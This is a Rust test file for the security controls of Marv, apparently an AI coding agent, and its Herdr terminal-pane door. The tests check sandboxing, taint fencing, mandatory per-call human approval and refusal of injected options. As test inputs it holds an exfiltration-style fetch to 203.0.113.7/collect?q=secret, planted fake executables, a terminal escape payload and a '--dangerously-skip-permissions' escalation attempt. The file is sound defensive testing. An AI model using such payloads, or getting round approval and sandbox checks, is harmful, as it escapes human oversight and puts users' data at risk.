//! `docs/SECURITY.md`, "The doors out of the sandbox": the Herdr door (#74). Marv drives Herdr from its own process;
//! the sandbox still can't reach it. Reads come back fenced and tainting; running a command or starting a worker is
//! asked every time, never remembered, and only where a person approves each one at a terminal; a spawned worker gets
//! no more than its parent; the session opens at most `herdr.peers` panes; light actions in a turn another agent
//! started get no "always"; what Herdr names and shows reaches the terminal only through `printable()`.
//!
//! Every test runs a fake `herdr` (`marv_session::herdr_door::fake`) from a folder of its own, never the user's Herdr:
//! no test reads `~/.config/herdr`, and the ones that start a process give it a cleared environment.

use std::path::Path;
use std::sync::Arc;

use marv_core::{Door, Provenance};
use marv_guards::{Recorder, Scripted, TempDir, say, sdk_turn, tool_call, use_tools};
use marv_session::herdr_door::fake::{fake_herdr_log, fake_setup};
use marv_session::herdr_door::{HERDR, HerdrDoor, NO_HERDR_DOOR, Peers};
use marv_tools::{Decision, ToolContext, ToolRef, run_tool};
use serde_json::json;

fn herdr_call(id: &str, args: serde_json::Value) -> marv_core::ToolCall {
    tool_call(id, HERDR, args)
}

/// What the fake Herdr was asked to start: a pane, a command, an agent or a worktree.
fn started(dir: &Path) -> Vec<String> {
    fake_herdr_log(dir)
        .into_iter()
        .filter(|l| {
            ["pane split", "tab create", "pane run", "agent start", "worktree create", "pane send"]
                .iter()
                .any(|s| l.starts_with(s))
        })
        .collect()
}

/// The sandbox stays unable to reach Herdr (#130): with Herdr's variables in Marv's environment and its socket in the
/// home, a sandboxed command sees neither, so only the door, in Marv's own process, talks to Herdr.
///
/// Proven: dropped `--clearenv` from the sandbox's arguments → the command saw HERDR_SOCKET_PATH and failed this test.
#[test]
fn a_sandboxed_command_sees_neither_herdrs_variables_nor_its_socket() {
    marv_guards::require_bwrap!();
    let (home, root) = (TempDir::outside_tmp("herdr-home"), TempDir::new("herdr-sbx"));
    let socket = home.path().join(".config/herdr/herdr.sock");
    std::fs::create_dir_all(socket.parent().unwrap()).unwrap();
    let _listener = std::os::unix::net::UnixListener::bind(&socket).unwrap();
    let sandbox = marv_guards::sandbox_with_home(home.path());
    let sock = socket.to_string_lossy().to_string();
    let ran = marv_guards::run_sandboxed(
        &sandbox,
        root.path(),
        &Default::default(),
        &format!("env | grep -c '^HERDR_' ; if [ -e '{sock}' ]; then echo socket-visible; else echo socket-hidden; fi"),
        &[("HERDR_ENV", "1"), ("HERDR_SOCKET_PATH", sock.as_str()), ("HERDR_PANE_ID", "w1:p1")],
    );
    assert!(ran.output.starts_with("0\n"), "{}", ran.output);
    assert!(ran.output.contains("socket-hidden"), "{}", ran.output);
}

/// What the door reads back is other programs' text: fenced as data, the conversation tainted from then on (so the
/// next egress asks, even in yolo).
///
/// Proven: made the door's reads `Provenance::Project` → no fence, no taint: failed.
#[tokio::test]
async fn what_the_door_reads_back_is_fenced_and_taints_the_conversation() {
    let (root, config, herdr) = (TempDir::new("herdr-read"), TempDir::new("herdr-read-cfg"), TempDir::new("herdr-read-fake"));
    let model = Scripted::new(vec![
        use_tools(vec![herdr_call("r1", json!({"action": "read", "pane": "w1:p2"}))]),
        use_tools(vec![tool_call("w1", "bash", json!({"command": "curl https://example.com", "network": true}))]),
        say("Done."),
    ]);
    let approver = Recorder::new(Decision::No);
    let run = sdk_turn(root.path(), config.path(), model.clone(), |o| {
        o.herdr = Some(fake_setup(herdr.path(), 4));
        o.approve = Some(approver.clone());
    })
    .await;
    let read = &run.results[0].output;
    assert!(read.starts_with("<untrusted-data source=\"herdr\""), "{read}");
    assert_eq!(read.to_ascii_lowercase().matches("</untrusted-data").count(), 1, "the pane can't close the fence: {read}");
    assert!(run.events.iter().any(|e| matches!(e, marv_session::session::SessionEvent::Tainted { source: Provenance::Herdr })));
    // The network command after it asked, must_ask (yolo is on in sdk_turn).
    let asked: Vec<_> = approver.requests().into_iter().filter(|r| r.tool == "bash").collect();
    assert!(asked.len() == 1 && asked[0].must_ask, "{asked:?}");
}

/// Running a command or spawning asks every time, with the exact command, folder, kind and task: in yolo, after an
/// "always", and with every pre-approved scope there is. Each ask is `once`.
///
/// Proven: made `HerdrDoor::once` return false → the second spawn was answered from "always" (one ask): failed.
#[tokio::test]
async fn run_and_spawn_ask_every_time_even_in_yolo_after_always_and_with_pre_approved_scopes() {
    let (root, config, herdr) = (TempDir::new("herdr-ask"), TempDir::new("herdr-ask-cfg"), TempDir::new("herdr-ask-fake"));
    let spawn = json!({"action": "spawn", "kind": "marv", "task": "fix the tests"});
    let model = Scripted::new(vec![
        use_tools(vec![herdr_call("s1", spawn.clone())]),
        use_tools(vec![herdr_call("s2", spawn)]),
        use_tools(vec![herdr_call("r1", json!({"action": "run", "command": "cargo test"}))]),
        use_tools(vec![herdr_call("r2", json!({"action": "run", "command": "cargo test"}))]),
        say("Done."),
    ]);
    let approver = Recorder::new(Decision::Always);
    let names = ["git_write", "network", "web", "mcp", "files", "memory", "agent_worktree", "process", "github"];
    let run = sdk_turn(root.path(), config.path(), model, |o| {
        o.herdr = Some(fake_setup(herdr.path(), 8));
        o.host_commands = true;
        o.approve = Some(approver.clone());
        o.pre_approved = names.iter().map(|n| n.to_string()).collect();
    })
    .await;
    assert!(run.results.iter().all(|r| !r.is_error), "{:?}", run.results);
    let asked = approver.requests();
    assert_eq!(asked.len(), 4, "four calls, four asks");
    assert!(asked.iter().all(|r| r.once && r.door == Some(Door::Herdr)), "{asked:?}");
    // sdk_turn's session is in yolo: its worker may be too (the user's config decides), and gets nothing else.
    assert_eq!(asked[0].preview.command.as_deref(), Some("/opt/marv/bin/marv"));
    assert_eq!(asked[0].preview.text.as_deref(), Some("fix the tests"));
    assert!(asked[0].preview.title.contains("marv worker"), "{}", asked[0].preview.title);
    assert!(asked[0].preview.note.as_deref().unwrap().starts_with("in . ·"), "{:?}", asked[0].preview.note);
    assert_eq!(asked[2].preview.command.as_deref(), Some("cargo test"));
}

/// Refused before any approver is asked where no person approves each command at a terminal: an SDK session without
/// `host_commands` whose approver says yes to everything.
///
/// Proven: removed the `ctx.doors.herdr` check from `HerdrDoor::judge_run` → the approver was asked and a pane opened.
#[tokio::test]
async fn a_session_without_host_commands_refuses_run_and_spawn_before_asking() {
    let (root, config, herdr) = (TempDir::new("herdr-sdk"), TempDir::new("herdr-sdk-cfg"), TempDir::new("herdr-sdk-fake"));
    let model = Scripted::new(vec![
        use_tools(vec![herdr_call("r1", json!({"action": "run", "command": "echo hi"}))]),
        use_tools(vec![herdr_call("s1", json!({"action": "spawn", "kind": "claude", "task": "hi"}))]),
        say("Done."),
    ]);
    let approver = Recorder::new(Decision::Yes);
    let run = sdk_turn(root.path(), config.path(), model, |o| {
        o.herdr = Some(fake_setup(herdr.path(), 4));
        o.approve = Some(approver.clone());
    })
    .await;
    assert_eq!([run.results[0].output.as_str(), run.results[1].output.as_str()], [NO_HERDR_DOOR, NO_HERDR_DOOR]);
    assert!(approver.requests().is_empty());
    assert!(started(herdr.path()).is_empty(), "{:?}", fake_herdr_log(herdr.path()));
}

/// `marv -p`, in a Herdr pane, with every `--approve` name, `--approve-tainted` and `--approve-protected`: the door
/// reads, and refuses to run or spawn anything.
///
/// It runs the `marv` binary at `MARV_ORACLE_BIN` (or the one `cargo test --workspace` built), which `cargo test` doesn't
/// rebuild by itself: build `marv-cli` first after a change, or this tests the old binary.
///
/// Two layers hold here: `marv -p` has no `host_commands` (so no `Doors::herdr`), and no `--approve` name covers
/// `herdr:`. Proven: set `host_commands` in `run_headless` and let `--approve process` cover `herdr:` → a pane opened
/// and the command ran (either alone: still refused).
#[test]
fn headless_refuses_run_and_spawn_with_every_approve_name() {
    let (root, config, herdr) = (TempDir::new("herdr-p"), TempDir::new("herdr-p-cfg"), TempDir::new("herdr-p-fake"));
    let setup = fake_setup(herdr.path(), 4);
    let call = |id: &str, args: serde_json::Value| marv_oracle::script::ScriptCall {
        id: Some(id.into()),
        name: HERDR.into(),
        arguments: args,
    };
    let calls = vec![
        vec![call("l1", json!({"action": "list"}))],
        vec![call("r1", json!({"action": "run", "command": "echo hi"}))],
        vec![call("s1", json!({"action": "spawn", "kind": "marv", "task": "hi"}))],
    ];
    let mut args = vec![];
    for name in ["git_write", "network", "web", "mcp", "files", "memory", "agent_worktree", "process", "github"] {
        args.extend(["--approve", name]);
    }
    args.extend(["--approve-tainted", "--approve-protected"]);
    let path = format!("{}:{}", setup.program.parent().unwrap().display(), std::env::var("PATH").unwrap_or_default());
    let socket = herdr.path().join("none.sock").to_string_lossy().to_string();
    let env = [
        ("PATH", path.as_str()),
        ("MARV_GITHUB", "off"),
        ("HERDR_ENV", "1"),
        ("HERDR_SOCKET_PATH", socket.as_str()),
        ("HERDR_PANE_ID", "w1:p1"),
    ];
    let out = marv_guards::headless_steps(root.path(), config.path(), calls, &args, &env);
    let log = fake_herdr_log(herdr.path());
    assert!(log.contains(&"agent list".to_string()), "the door was offered and read: {log:?}\n{}", out.stderr);
    assert!(started(herdr.path()).is_empty(), "{log:?}");
}

/// A subagent's context has no door: the herdr tool, even handed to it, refuses before its approver is asked.
///
/// Proven: gave the subagent's context its parent's doors in `subagent_context` → the subagent's spawn was asked and
/// a pane opened.
#[tokio::test]
async fn a_subagents_context_refuses_run_and_spawn() {
    let (root, herdr) = (TempDir::new("herdr-sub"), TempDir::new("herdr-sub-fake"));
    let mut parent = ToolContext::new(root.path());
    parent.doors.herdr = true;
    let approver = Recorder::new(Decision::Yes);
    let sub = marv_session::subagent::subagent_context(&parent, "general-purpose · task", None, Some(approver.clone()));
    let tools: Vec<ToolRef> = vec![Arc::new(HerdrDoor::new(fake_setup(herdr.path(), 4), Arc::default()))];
    let out = run_tool(&herdr_call("s1", json!({"action": "spawn", "kind": "marv", "task": "x"})), &sub, &tools).await;
    assert_eq!(out.result.output, NO_HERDR_DOOR);
    assert!(approver.requests().is_empty());
    assert!(started(herdr.path()).is_empty());
}

/// A spawned worker gets no more than its parent: a Marv starts with nothing but the user's config (no `--approve`,
/// held out of yolo unless its parent is in yolo, which `MARV_YOLO=off` does whatever the config says); another
/// agent kind starts with no arguments of a model's choosing.
///
/// Proven: dropped the `!ctx.yolo` case from `marv_command` → the worker of a parent out of yolo started without
/// `MARV_YOLO=off`: failed; made `resolve_config` ignore `MARV_YOLO` → failed.
#[tokio::test]
async fn a_spawned_worker_never_gets_more_than_its_parent() {
    let (root, config, herdr) = (TempDir::new("herdr-perm"), TempDir::new("herdr-perm-cfg"), TempDir::new("herdr-perm-fake"));
    let model = Scripted::new(vec![
        use_tools(vec![herdr_call("s1", json!({"action": "spawn", "kind": "marv", "task": "one", "name": "one"}))]),
        use_tools(vec![herdr_call("s2", json!({"action": "spawn", "kind": "claude", "task": "two", "name": "two"}))]),
        use_tools(vec![herdr_call(
            "s3",
            json!({"action": "spawn", "kind": "claude", "task": "three", "args": ["--dangerously-skip-permissions"]}),
        )]),
        say("Done."),
    ]);
    let run = sdk_turn(root.path(), config.path(), model, |o| {
        o.herdr = Some(fake_setup(herdr.path(), 4));
        o.host_commands = true;
        o.yolo = false;
        o.approve = Some(Recorder::new(Decision::Yes));
        o.pre_approved = vec!["web".into(), "network".into()];
    })
    .await;
    // A model's own arguments for the agent are never passed on: the field isn't in the schema (#65 drops it, and
    // says so to the model).
    assert!(run.results[2].output.contains("unknown field \"args\" was dropped"), "{}", run.results[2].output);
    let started = started(herdr.path());
    assert!(started.contains(&"pane run w1:p5 MARV_YOLO=off /opt/marv/bin/marv".to_string()), "{started:?}");
    assert!(started.contains(&"agent start two --kind claude --pane w1:p6".to_string()), "{started:?}");
    assert!(!started.iter().any(|l| l.contains("--approve") || l.contains("--dangerously") || l.contains(" -- ")), "{started:?}");
    // MARV_YOLO=off holds the worker out of yolo though the user's config has it on.
    let file = marv_session::config::FileConfig { yolo: Some(true), ..Default::default() };
    let env: marv_session::config::Env = [("MARV_YOLO".to_string(), "off".to_string())].into();
    assert!(!marv_session::config::resolve_config(Some(&file), &env).yolo);
    assert!(marv_session::config::resolve_config(Some(&file), &Default::default()).yolo);
}

/// At most `herdr.peers` panes per session: the next run or spawn is refused before anyone is asked.
///
/// Proven: removed the limit check from `HerdrDoor::judge_run` → the third call was asked (the slot check in `start`
/// still refused it after the ask): failed.
#[tokio::test]
async fn the_peer_limit_holds_before_anyone_is_asked() {
    let (root, config, herdr) = (TempDir::new("herdr-lim"), TempDir::new("herdr-lim-cfg"), TempDir::new("herdr-lim-fake"));
    let model = Scripted::new(vec![
        use_tools(vec![herdr_call("r1", json!({"action": "run", "command": "echo 1"}))]),
        use_tools(vec![herdr_call("r2", json!({"action": "run", "command": "echo 2"}))]),
        use_tools(vec![herdr_call("s1", json!({"action": "spawn", "kind": "marv", "task": "3"}))]),
        say("Done."),
    ]);
    let approver = Recorder::new(Decision::Yes);
    let run = sdk_turn(root.path(), config.path(), model, |o| {
        o.herdr = Some(fake_setup(herdr.path(), 2));
        o.host_commands = true;
        o.approve = Some(approver.clone());
    })
    .await;
    assert!(run.results[2].is_error && run.results[2].output.contains("opened its 2 Herdr panes"), "{}", run.results[2].output);
    assert_eq!(approver.requests().len(), 2);
    assert_eq!(started(herdr.path()).iter().filter(|l| l.starts_with("pane split")).count(), 2);
}

/// A light action in a turn another agent started (a mesh wake, #78) gets no "always": the person who answered
/// "always" for focus in their own turn is asked again in the woken one.
///
/// Proven: left `Woken::Inbox` out of `turn_body`'s automatic-approval cut (`unattended`) → the woken turn's focus was answered
/// from "always" (one ask): failed.
#[tokio::test]
async fn a_light_action_in_a_woken_turn_gets_no_always() {
    use futures::StreamExt;
    use marv_mesh::approval::WireRequest;
    use marv_mesh::switchboard::{NoTrajectory, Switchboard};
    use marv_mesh::{ReceptacleName, WireMode};
    use marv_session::mesh::{parent_id, wake_check};

    let (project, runtime, herdr) =
        (TempDir::new("herdr-wake"), TempDir::short("herdr-wake-rt"), TempDir::new("herdr-wake-fake"));
    let mesh = Arc::new(Switchboard::new("hw", runtime.path().join("plugs"), Arc::new(NoTrajectory)));
    let cancel = tokio_util::sync::CancellationToken::new();
    tokio::spawn(Arc::clone(&mesh).serve(cancel.clone()));
    let focus = || use_tools(vec![herdr_call("f", json!({"action": "focus", "target": "w1:t1"}))]);
    let model = Scripted::new(vec![focus(), say("Focused."), focus(), say("Focused again.")]);
    let person = Recorder::new(Decision::Always);
    let mut init = marv_session::SessionInit::new(
        project.path(),
        marv_session::ProviderChoice::Option(marv_provider::ProviderOption::Custom(model.clone())),
    );
    (init.diagnostics, init.checks) = (false, false);
    init.mesh = Some(mesh.clone());
    init.approve = Some(person.clone());
    init.herdr = Some(fake_setup(herdr.path(), 4));
    let session = marv_session::MarvSession::new(init).unwrap();
    let drain = |mut turn: marv_session::session::Turn| async move { while turn.next().await.is_some() {} };
    drain(session.send("focus the main tab", Default::default()).unwrap()).await;
    assert_eq!(person.requests().len(), 1);

    let worker = mesh.plug_next("worker").unwrap();
    let inbox = ReceptacleName::new("agent.parent.inbox").unwrap();
    let request = WireRequest { from: worker.id.clone(), to: inbox.clone(), mode: WireMode::Send, asked_by: worker.id.clone() };
    mesh.grant(request, marv_mesh::wire::Approver::Tui).await.unwrap();
    mesh.deliver(&worker.id, inbox.as_str(), WireMode::Send, json!({"text": "focus the main tab"})).await.unwrap();
    let wake = wake_check(&mesh, &mut Default::default(), 0).wake.expect("a wake");
    drain(session.wake(&wake).unwrap().expect("a woken turn")).await;
    let asked = person.requests();
    assert_eq!(asked.len(), 2, "asked again in the woken turn");
    assert!(asked[1].once && asked[1].door == Some(Door::Herdr));
    let _ = parent_id();
    cancel.cancel();
    session.close().await;
}

/// What Herdr names and shows (pane names, titles, a pane's output) reaches the terminal only through `printable()`:
/// `/peers`' list strips escapes.
///
/// Proven: dropped `printable` from `peers_text` → the escape reached the list: failed.
#[tokio::test]
async fn herdr_names_and_output_reach_the_terminal_only_through_printable() {
    let herdr = TempDir::new("herdr-print");
    let peers: Arc<Peers> = Arc::default();
    let root = TempDir::new("herdr-print-root");
    let tools: Vec<ToolRef> = vec![Arc::new(HerdrDoor::new(fake_setup(herdr.path(), 4), peers.clone()))];
    let approver = Recorder::new(Decision::Yes);
    let mut ctx = ToolContext::new(root.path());
    ctx.doors.herdr = true;
    ctx.approver = Some(approver.clone());
    let spawn = json!({"action": "spawn", "kind": "marv", "task": "fix \u{1b}]0;pwned\u{7} it"});
    let out = run_tool(&herdr_call("s1", spawn), &ctx, &tools).await;
    assert!(!out.result.is_error, "{}", out.result.output);
    let text = marv_session::herdr_door::peers_text(&peers.list(), &[Some("idle".into())]);
    assert!(!text.contains('\u{1b}') && !text.contains('\u{7}'), "{text:?}");
    assert!(text.contains("peer-") && text.contains("w1:p5"), "{text}");
}

// ---- the review's fixes (marv-amb.6) ----

/// `/peers stop` never answers the worker's pending question: `/exit` and Enter (or ctrl+c) are typed only into an
/// agent Herdr calls idle or done. A working or blocked one (an approval, where Marv's Enter picks Yes) gets nothing
/// typed: its pane is just closed.
///
/// Proven: dropped the idle/done check from `HerdrAdapter::stop` → `/exit` and Enter were typed into the blocked
/// Marv: failed.
#[tokio::test]
async fn stopping_a_peer_types_nothing_into_an_agent_thats_busy_or_asking() {
    use marv_mesh::herdr::{HerdrAdapter, Place, Stopped};
    use marv_session::herdr_door::fake::{install_fake_herdr, set_pane_state};
    for (state, marv) in [("blocked", true), ("working", true), ("blocked", false)] {
        let herdr = TempDir::new("herdr-stop");
        let adapter = HerdrAdapter::new(install_fake_herdr(herdr.path()), Some("w1:p1".into()));
        let pane = adapter.open_pane(Place::Tab, None, "/w", None).await.unwrap();
        if marv {
            adapter.pane_run(&pane, "marv").await.unwrap();
        } else {
            adapter.agent_start("rev", "claude", &pane).await.unwrap();
        }
        set_pane_state(herdr.path(), &pane, state);
        assert_eq!(adapter.stop(&pane, marv).await.unwrap(), Stopped::Closed);
        let log = fake_herdr_log(herdr.path());
        assert!(!log.iter().any(|l| l.starts_with("pane send-")), "{state}: {log:?}");
        assert!(log.contains(&format!("pane close {pane}")), "{state}: {log:?}");
    }
}

/// The doors' programs come only from an absolute PATH entry outside the project and the sandbox's writable folders:
/// a `herdr` or `gh` a sandboxed command could have put there is never run (nor picked for later).
///
/// Proven: made `marv_sandbox::host_env::host_program` take any PATH entry, with no `outside` check → the planted gh
/// ran (its marker appeared) and the planted herdr became the door's program: failed; made `mesh_cmd::start` give the
/// switchboard a bare `"herdr"` again (a PATH lookup) → `mesh_list` ran the planted one: failed. The `marv -p` part runs
/// the binary at `MARV_ORACLE_BIN`, which `cargo test` doesn't rebuild: build `marv-cli` first.
#[tokio::test]
async fn a_door_program_planted_in_the_project_is_never_run() {
    use std::os::unix::fs::PermissionsExt;
    let project = TempDir::new("doors-planted");
    let marker = project.path().join("ran");
    for name in ["gh", "herdr"] {
        let program = project.write(&format!("node_modules/.bin/{name}"), &format!("#!/bin/sh\ntouch '{}'\n", marker.display()));
        std::fs::set_permissions(&program, std::fs::Permissions::from_mode(0o755)).unwrap();
    }
    let planted = project.path().join("node_modules/.bin").to_string_lossy().to_string();
    let path = format!("node_modules/.bin:.:{planted}");
    let outside = vec![project.path().to_path_buf()];
    let env: Vec<(String, String)> = vec![("PATH".into(), path.clone())];
    assert!(!marv_tools::github::github_available(&env, &outside, std::time::Duration::from_secs(2)).await);
    let herdr_env: marv_session::config::Env = [
        ("PATH".to_string(), path),
        ("HERDR_ENV".to_string(), "1".to_string()),
        ("HERDR_SOCKET_PATH".to_string(), "/nonexistent.sock".to_string()),
        ("HERDR_PANE_ID".to_string(), "w1:p1".to_string()),
    ]
    .into();
    assert!(marv_session::herdr_door::setup_from_env(&herdr_env, 4, &outside).is_none());
    assert!(!marker.exists(), "a planted program ran");

    // The mesh's Herdr panes (mesh_list in `marv -p` on the mesh) take herdr the same way: the planted one never runs.
    let (config, runtime) = (TempDir::new("doors-planted-cfg"), TempDir::short("doors-planted-rt"));
    let system = std::env::var("PATH").unwrap_or_default();
    let path = format!("{planted}:{system}");
    let (runtime_var, runtime_dir) = marv_guards::runtime_var(runtime.path());
    let runtime_dir = runtime_dir.to_string_lossy().to_string();
    let env = [
        ("PATH", path.as_str()),
        ("MARV_GITHUB", "off"),
        ("MARV_MESH_NAME", "planted"),
        (runtime_var, runtime_dir.as_str()),
        ("HERDR_ENV", "1"),
        ("HERDR_SOCKET_PATH", "/nonexistent.sock"),
        ("HERDR_PANE_ID", "w1:p1"),
    ];
    let list = marv_oracle::script::ScriptCall { id: Some("m1".into()), name: "mesh_list".into(), arguments: json!({}) };
    let out = marv_guards::headless_steps(project.path(), config.path(), vec![vec![list]], &[], &env);
    assert!(out.stderr.is_empty() || !out.stderr.contains("panicked"), "{}", out.stderr);
    assert!(!marker.exists(), "mesh_list ran the planted herdr");
}

/// Nothing a model passes reaches the `herdr` CLI as an option: ids, names, commands and prompts starting with `-`
/// are refused before Herdr hears anything.
///
/// Proven, one at a time: dropped the first-character check from `plain_id` (ids), the leading `-` check on a rename's
/// name, the one on a run's command, and the one in `pane_prompt` (prompts and tasks) → each let its `-…` reach the
/// fake herdr: failed.
#[tokio::test]
async fn nothing_starting_with_a_dash_reaches_the_herdr_cli() {
    let (root, herdr) = (TempDir::new("herdr-dash"), TempDir::new("herdr-dash-fake"));
    let tools: Vec<ToolRef> = vec![Arc::new(HerdrDoor::new(fake_setup(herdr.path(), 4), Arc::default()))];
    let approver = Recorder::new(Decision::Yes);
    let mut ctx = ToolContext::new(root.path());
    ctx.doors.herdr = true;
    ctx.approver = Some(approver.clone());
    for args in [
        json!({"action": "read", "pane": "--help"}),
        json!({"action": "status", "pane": "-h"}),
        json!({"action": "list", "what": "panes", "workspace": "--version"}),
        json!({"action": "focus", "target": "-x:p1"}),
        json!({"action": "rename", "target": "w1:p2", "name": "--help"}),
        json!({"action": "prompt", "pane": "w1:p2", "text": "--help"}),
        json!({"action": "run", "command": "--help"}),
        json!({"action": "spawn", "kind": "marv", "task": "--version"}),
    ] {
        let out = run_tool(&herdr_call("d", args.clone()), &ctx, &tools).await;
        assert!(out.result.is_error, "{args}: {}", out.result.output);
    }
    let log = fake_herdr_log(herdr.path());
    assert!(log.iter().all(|l| !l.split(' ').any(|w| w.starts_with('-') && w != "--no-focus")), "{log:?}");
    assert!(started(herdr.path()).is_empty(), "{log:?}");
}

/// Spawning from a tainted conversation starts the worker tainted: its command carries `MARV_TAINTED=1`, and a Marv
/// started so treats its first message as untrusted, so its first egress asks (here: `marv -p --approve web` without
/// `--approve-tainted` is refused).
///
/// Proven: dropped the taint prefix from `marv_command` → the worker's command had no MARV_TAINTED: failed; made
/// `run_headless` ignore MARV_TAINTED → the fetch went out: failed.
#[tokio::test]
async fn a_worker_spawned_from_a_tainted_conversation_starts_tainted() {
    let (root, config, herdr) = (TempDir::new("herdr-taint"), TempDir::new("herdr-taint-cfg"), TempDir::new("herdr-taint-fake"));
    let model = Scripted::new(vec![
        use_tools(vec![herdr_call("r1", json!({"action": "read", "pane": "w1:p2"}))]),
        use_tools(vec![herdr_call("s1", json!({"action": "spawn", "kind": "marv", "task": "fix it"}))]),
        say("Done."),
    ]);
    sdk_turn(root.path(), config.path(), model, |o| {
        o.herdr = Some(fake_setup(herdr.path(), 4));
        o.host_commands = true;
        o.approve = Some(Recorder::new(Decision::Yes));
    })
    .await;
    assert!(
        started(herdr.path()).contains(&"pane run w1:p5 MARV_TAINTED=1 /opt/marv/bin/marv".to_string()),
        "{:?}",
        fake_herdr_log(herdr.path())
    );

    // The child side: a Marv started with MARV_TAINTED=1 asks before its first egress.
    let (seen, proxy) = one_request_proxy();
    let fetch = marv_oracle::script::ScriptCall {
        id: Some("w1".into()),
        name: "web_fetch".into(),
        arguments: json!({"url": "http://203.0.113.7/collect?q=secret"}),
    };
    let child = |tainted: bool| {
        let (root, config) = (TempDir::new("herdr-child"), TempDir::new("herdr-child-cfg"));
        let path = std::env::var("PATH").unwrap_or_default();
        let mut env = vec![
            ("PATH", path.as_str()),
            ("MARV_GITHUB", "off"),
            ("http_proxy", proxy.as_str()),
            ("HTTP_PROXY", proxy.as_str()),
            ("NO_PROXY", "127.0.0.1,localhost"),
            ("no_proxy", "127.0.0.1,localhost"),
        ];
        if tainted {
            env.push(("MARV_TAINTED", "1"));
        }
        marv_guards::headless_steps(root.path(), config.path(), vec![vec![fetch.clone()]], &["--approve", "web"], &env)
    };
    let out = child(true);
    assert_eq!(out.code, Some(3), "{}\n{}", out.result, out.stderr);
    assert_eq!(out.result["refused"][0]["tool"], "web_fetch");
    assert!(seen.lock().unwrap().is_empty(), "nothing went out");
    // Control: without it, the same fetch goes out.
    child(false);
    assert_eq!(seen.lock().unwrap().len(), 1);
}

/// A local HTTP proxy that answers every request with a short page and records the request lines.
fn one_request_proxy() -> (Arc<std::sync::Mutex<Vec<String>>>, String) {
    use std::io::{Read, Write};
    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let port = listener.local_addr().unwrap().port();
    let seen = Arc::new(std::sync::Mutex::new(Vec::new()));
    let log = seen.clone();
    std::thread::spawn(move || {
        for mut stream in listener.incoming().flatten() {
            let mut head = Vec::new();
            let mut buf = [0u8; 4096];
            while !head.windows(4).any(|w| w == b"\r\n\r\n") {
                match stream.read(&mut buf) {
                    Ok(0) | Err(_) => break,
                    Ok(n) => head.extend_from_slice(&buf[..n]),
                }
            }
            log.lock().unwrap().push(String::from_utf8_lossy(&head).lines().next().unwrap_or_default().to_string());
            let body = "a page";
            let _ = stream.write_all(
                format!(
                    "HTTP/1.1 200 OK\r\ncontent-type: text/plain\r\ncontent-length: {}\r\nconnection: close\r\n\r\n{body}",
                    body.len()
                )
                .as_bytes(),
            );
        }
    });
    (seen, format!("http://127.0.0.1:{port}"))
}

/// In a tainted conversation a prompt to another agent is egress: asked every time (an earlier "always" for that
/// pane doesn't answer it), and the approval says the receiving agent will take the text as the user's own words.
///
/// Proven: left `prompt` out of `HerdrDoor::uses_network` → the second prompt was answered from "always": failed;
/// dropped the `OWN_WORDS` warning → failed.
#[tokio::test]
async fn a_prompt_in_a_tainted_conversation_asks_every_time_and_says_whose_words() {
    let (root, config, herdr) = (TempDir::new("herdr-pt"), TempDir::new("herdr-pt-cfg"), TempDir::new("herdr-pt-fake"));
    let prompt = || use_tools(vec![herdr_call("p", json!({"action": "prompt", "pane": "w1:p2", "text": "review the diff"}))]);
    let model = Scripted::new(vec![
        prompt(),
        use_tools(vec![herdr_call("r1", json!({"action": "read", "pane": "w1:p2"}))]),
        prompt(),
        say("Done."),
    ]);
    let approver = Recorder::new(Decision::Always);
    sdk_turn(root.path(), config.path(), model, |o| {
        o.herdr = Some(fake_setup(herdr.path(), 4));
        o.approve = Some(approver.clone());
    })
    .await;
    let asked: Vec<_> = approver.requests().into_iter().filter(|r| r.tool == HERDR).collect();
    assert_eq!(asked.len(), 2, "the earlier \"always\" didn't answer the tainted prompt");
    assert!(!asked[0].must_ask && asked[1].must_ask);
    assert_eq!(asked[1].preview.warning.as_deref(), Some(marv_session::herdr_door::OWN_WORDS));
}
